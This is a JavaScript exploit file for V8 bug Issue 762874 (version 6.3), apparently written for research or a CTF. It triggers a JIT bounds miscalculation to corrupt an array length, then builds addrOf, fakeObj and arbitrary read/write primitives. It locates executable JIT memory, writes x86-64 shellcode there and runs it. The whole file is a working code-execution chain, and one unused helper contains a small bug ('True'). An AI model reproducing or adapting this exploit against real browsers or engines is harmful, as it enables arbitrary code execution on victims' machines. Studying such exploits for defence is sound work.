/*************************************************************
 * File Name: oldExp.js
 * 
 * Created on: 2020-03-09 04:44:37
 * Author: raycp
 * 
 * Last Modified: 2020-03-09 06:11:49
 * Description: exp for Issue 762874, on version 6.3
************************************************************/

const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x" + i.toString(16).padStart(16, "0");
}

function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}


// create a jit function
var jit = new Function("var a = 1000000");
//%DebugPrint(jit);
//%SystemBreak();

const maxLength = 1073741799 //%StringMaxLength();
const s = 'A'.repeat(maxLength);
const maxSize = 1028*8;
//print(i2f(0x202000000000));
var oobArray = undefined;
var obj = undefined;
var dataBuf = undefined;
var dataView = undefined;
function foo(i) {

    let idx  = s.lastIndexOf("", maxLength);
    idx += 25;
    idx = idx >>30;
    let tmp = i & 7;
    idx = idx * tmp;
    let arr = [1.1, 2.2, 3.3, 2.2];
    arr[idx] = 1.74512933848984e-310;   // overwrite the length

    let buf =  new ArrayBuffer(0x200);
    let o = {m:i2f(0xdeadbeef), n:jit};
    return [arr, buf, o];
    //return arr;
}

function buildOOBArray() 
{
    let arr = undefined;
    for(let i=0; i<MAX_ITERATIONS; i++)
    {
        foo(1);
        foo(0);
    }
    arr = foo(7);
    return arr;

}


// build oob array
var ret = buildOOBArray();
oobArray = ret[0];
obj = ret[2];
dataBuf = ret[1];
dataView = new DataView(dataBuf);
print("[+] now oobArray length: "+oobArray.length);

// looking for obj element offset 
var floatObjectIdx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0xdeadbeef) {
        floatObjectIdx = i + 1;
        print("[+] float idx of object is: 0x"+hex(floatObjectIdx));
        break;
    }
} 

// looking for backing_stroe in data_buf
var floatArrayBufIdx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0x20000000000) {

        floatArrayBufIdx = i + 1;
        print("[+] float idx of array buf backing store is: 0x"+hex(floatArrayBufIdx));
        break;
    }
}

//print(typeof dataBuf);

// build addrOf primitive 
function addrOf(objPara)
{
    obj.n=objPara;
    return f2i(oobArray[floatObjectIdx]) - 1;
}

// build fakeObj primitive
function fakeObj(fakeObjAddr)
{
    oobArray[floatObjectIdx] = i2f(fakeObjAddr);
    return obj.n;
}

// build aar primitive
function dataViewRead64(addr)
{
    oobArray[floatArrayBufIdx]=i2f(addr);
    return f2i(dataView.getFloat64(0, true));
}

// build aaw primitive
function dataViewWrite64(addr, value)
{
    oobArray[floatArrayBufIdx] = i2f(addr);
    return dataView.setFloat64(0, f2i(value), True);
}

function dataViewWrite(addr, payload)
{
    oobArray[floatArrayBufIdx] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}

// leak rwx memory here
var jitObjAddr = addrOf(jit);
print("[+] jit obj addr: "+hex(jitObjAddr));
var rwxAddr = dataViewRead64(jitObjAddr+0x38)-1+0x60;

print("[+] rwx addr: "+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// wite the shellcode to wasm code
dataViewWrite(rwxAddr, shellcode);
// trigger wasm code and execute shellcode
jit();

